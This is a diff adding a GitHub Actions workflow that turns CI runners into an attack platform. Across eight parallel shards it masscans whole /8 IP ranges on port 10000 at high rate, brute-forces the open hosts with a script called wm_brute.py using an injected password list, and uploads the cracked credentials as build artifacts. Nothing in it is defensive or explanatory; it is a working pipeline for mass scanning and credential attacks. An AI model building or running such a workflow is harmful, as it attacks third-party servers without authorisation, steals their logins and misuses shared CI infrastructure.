@@ -1,0 +1,40 @@
+name: fullip2
+on: workflow_dispatch
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [1, 2, 3, 4, 5, 6, 7, 8]
+    steps:
+      - uses: actions/checkout@v4
+      - run: |
+          sudo apt-get update -qq && sudo apt-get install -y -qq masscan && pip install -q requests
+      - name: prepare password list
+        run: |
+          python3 - <<'PY'
+          import re
+          src = open('wm_brute.py').read()
+          pl = open('pwlist2.txt').read().split()
+          src = re.sub(r"PASSWORDS = \[[^\]]*\]", "PASSWORDS = " + repr(pl), src, flags=re.S)
+          open('wm_brute.py','w').write(src)
+          PY
+      - name: masscan shard
+        run: |
+          RANGES=$(cat r8_${{ matrix.shard }}.txt)
+          echo "scanning: $(echo $RANGES | wc -w) /8 blocks"
+          sudo masscan $RANGES -p10000 --rate 100000 -oL s.txt --wait 0 || true
+          awk '$1=="open"{print $4":"$3}' s.txt | sort -u > shard_hosts.txt
+          echo "=== shard ${{ matrix.shard }} hosts: $(wc -l < shard_hosts.txt) ==="
+      - name: sweep
+        run: python3 wm_brute.py shard_hosts.txt || true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: fullip2-${{ matrix.shard }}
+          path: |
+            /tmp/wm_brute_hits.json
+            shard_hosts.txt
+          if-no-files-found: warn
